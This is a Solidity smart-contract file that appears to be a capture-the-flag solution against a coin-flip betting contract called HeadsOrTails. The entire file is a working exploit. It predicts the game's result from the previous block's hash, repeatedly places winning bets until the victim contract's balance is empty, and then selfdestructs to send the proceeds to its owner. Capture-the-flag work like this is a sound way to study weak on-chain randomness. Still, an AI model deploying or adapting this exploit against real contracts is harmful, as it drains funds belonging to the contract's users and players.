pragma solidity 0.4.24;

interface HeadsOrTails {
    function play(bool heads) external payable;
    function ctf_challenge_add_authorized_sender(address _addr) external;
}

contract HeadsOrTailsExploit {
    
    address public owner;
    address public victim_addr;
    
    constructor(address addr) public {
        owner = msg.sender;
        victim_addr = addr;
    }
    
    function () payable public {}
    
    function exploit() external payable {
        bytes32 entropy = blockhash(block.number-1);
        bytes1 coinFlip = entropy[0] & 1;
        
        while (address(victim_addr).balance > 0) {
            HeadsOrTails(victim_addr).play.value(.1 ether)(coinFlip == 1);
        }
        
        selfdestruct(owner);
    }
}
